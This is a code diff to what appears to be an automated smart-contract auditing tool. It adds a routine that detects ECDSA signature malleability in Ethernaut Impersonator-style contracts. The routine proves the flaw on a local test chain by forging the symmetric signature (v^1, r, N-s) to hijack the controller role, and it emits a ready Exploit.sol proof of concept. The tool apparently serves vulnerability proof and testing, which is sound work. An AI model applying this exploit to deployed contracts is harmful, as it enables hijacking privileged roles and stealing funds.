@@ -2557,6 +2557,117 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Impersonator 류: ecrecover 로 권한(controller)을 확인하면서 소모 서명을
+    정확한 (v,r,s) 로만 표시하고 s 정규화가 없다. 같은 서명자를 복구하는 대칭 서명
+    (v^1, r, N-s)으로 changeController 를 호출해 controller 를 탈취한다."""
+    import solcx
+    from web3 import Web3
+    from eth_account import Account
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if "ecrecover" not in tb:
+        return None
+    # 역할 변경 함수: (uint8, bytes32, bytes32, address) 를 받아 role = <address arg>
+    changer = None; role = None; addr_arg = None
+    for fn in _functions(tb):
+        ts = [a[0] for a in fn["args"]]
+        if fn["external"] and ts[:3] == ["uint8", "bytes32", "bytes32"] and "address" in ts:
+            an = fn["args"][ts.index("address")][1]
+            mm = re.search(r"(\w+)\s*=\s*" + re.escape(an), fn["body"])
+            if mm:
+                changer, role, addr_arg = fn["name"], mm.group(1), an; break
+    if not changer or not role:
+        return None
+    # s 정규화가 있으면(안전) 스킵 신호이나, 동적 검증이 최종 판정이므로 그대로 진행
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    if not _has_getter(abi, role):
+        return None
+    ctypes = _abi_ctor_types(abi)
+    if "uint8" not in ctypes or ctypes.count("bytes32") < 3:
+        return None
+    w3, acct = _mk_evm()
+    ck = Account.create()
+    msgHash = Web3.keccak(text="trust404-lock")
+    sig = Account.unsafe_sign_hash(msgHash, ck.key)
+    v, r, s = sig.v, sig.r, sig.s
+    # 생성자 인자: uint8=v, 그 앞 bytes32=msgHash, 그 뒤 두 bytes32=r,s, uint256=1
+    vi = ctypes.index("uint8")
+    cargs = []
+    seen_after_v = 0; before_v_bytes32 = None
+    # 먼저 v 앞 마지막 bytes32 인덱스 찾기
+    for i in range(vi):
+        if ctypes[i] == "bytes32": before_v_bytes32 = i
+    b32_after = [i for i in range(vi+1, len(ctypes)) if ctypes[i] == "bytes32"]
+    for i, tI in enumerate(ctypes):
+        if i == vi: cargs.append(v)
+        elif i == before_v_bytes32: cargs.append(msgHash)
+        elif len(b32_after) >= 2 and i == b32_after[0]: cargs.append(r.to_bytes(32,"big"))
+        elif len(b32_after) >= 2 and i == b32_after[1]: cargs.append(s.to_bytes(32,"big"))
+        elif tI.startswith("uint"): cargs.append(1)
+        elif tI == "bytes32": cargs.append(msgHash)
+        else: cargs.append(_default_for_type(tI))
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*cargs).transact({"from":w3.eth.accounts[1],"gas":3_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    c0 = tc.functions[role]().call()
+    if int(c0, 16) != int(ck.address, 16):   # 서명자가 controller 로 설정됐는지 확인(배선 성공)
+        return None
+    N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+    s2 = N - s; v2 = 27 if v == 28 else 28
+    # changeController(v2, r, s2, attacker) — 인자 순서대로 채움
+    call_args = []
+    ai = 0
+    for tI in [a[0] for a in next(f for f in _functions(tb) if f["name"]==changer)["args"]]:
+        if tI == "uint8": call_args.append(v2)
+        elif tI == "bytes32": call_args.append((r.to_bytes(32,"big") if ai==0 else s2.to_bytes(32,"big"))); ai += 1
+        elif tI == "address": call_args.append(Web3.to_checksum_address(acct))
+        else: call_args.append(_default_for_type(tI))
+    try:
+        getattr(tc.functions, changer)(*call_args).transact({"from":acct,"gas":400_000})
+    except Exception:
+        return None
+    c1 = tc.functions[role]().call()
+    if int(c1, 16) != int(acct, 16):
+        return None
+    poc = (HEADER +
+        "// Strategy: ECDSA malleability (Ethernaut Impersonator). usedSignatures marks only\n"
+        "// the exact (v,r,s), and s is not normalized, so the symmetric signature\n"
+        "// (v^1, r, N-s) recovers the same signer yet counts as unused —\n"
+        f"// call {changer}(v', r, N-s, attacker) to seize `{role}`.\n"
+        f"interface IT {{ function {changer}(uint8,bytes32,bytes32,address) external; }}\n"
+        "contract Exploit {\n"
+        "    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;\n"
+        "    function run(address t, uint8 v, bytes32 r, bytes32 s) external {\n"
+        "        uint8 v2 = v == 28 ? 27 : 28;\n"
+        "        bytes32 s2 = bytes32(N - uint256(s));\n"
+        f"        IT(t).{changer}(v2, r, s2, msg.sender);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (ecdsa-malleability)","strategy":"ecdsa-malleability","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{role} hijacked via ECDSA signature malleability",
+            "strategy":f"ecdsa-malleability:{changer}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"소모 서명을 정확한 (v,r,s) 로만 표시하고 s 정규화가 없어, 대칭 서명(v^1,r,N-s)으로 controller 를 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Puzzle Wallet 류: 프록시(pendingAdmin/admin)와 월렛(owner/maxBalance)의
     스토리지 충돌 + multicall 예치 중복. proposeNewAdmin 으로 owner 선점 → 화이트리스트 →
@@ -4547,6 +4658,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0z2) Impersonator (ECDSA 서명 가변성 → controller 탈취)
+    try:
+        r = _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0z) Puzzle Wallet (프록시 스토리지 충돌 + multicall → admin 탈취)
     try:
         r = _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4665,7 +4783,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_higher_order, _synth_switch, _synth_array_underflow,
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
                _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
-               _synth_uninitialized, _synth_puzzle_wallet):
+               _synth_uninitialized, _synth_puzzle_wallet, _synth_ecdsa_malleability):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
